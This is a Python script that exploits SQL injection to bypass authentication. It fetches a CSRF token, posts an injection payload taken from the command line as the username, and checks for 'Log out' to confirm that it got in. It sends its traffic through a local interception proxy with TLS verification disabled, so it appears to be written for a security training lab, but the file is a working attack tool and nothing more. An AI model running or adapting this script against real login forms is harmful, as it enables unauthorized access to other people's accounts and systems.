import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}


def get_csrf(s,url):
    r = s.get(url, verify = False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input")['value']
    return csrf

def exploit_sql(s, url, payload):
    csrf = get_csrf(s, url)
    data = {"csrf" : csrf , 
            "username" : payload, 
            "password" : "randomtext"}
    r = s.post(url,data = data, verify=False, proxies = proxies )
    res = r.text
    if "Log out" in res:
        return True
    else:
        return False



if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[*] Error!\n[*]You should use: %s <url> <payload>" % sys.argv[0])
        print('[*] Example: %s www.example.com "admin"' % sys.argv[0] )
        exit(-1)
    
    s = requests.Session()
 
    if exploit_sql(s, url, payload):
       print("You bypass the authentication successful!")
    else:
        print("Bypass unsuccesful!")
        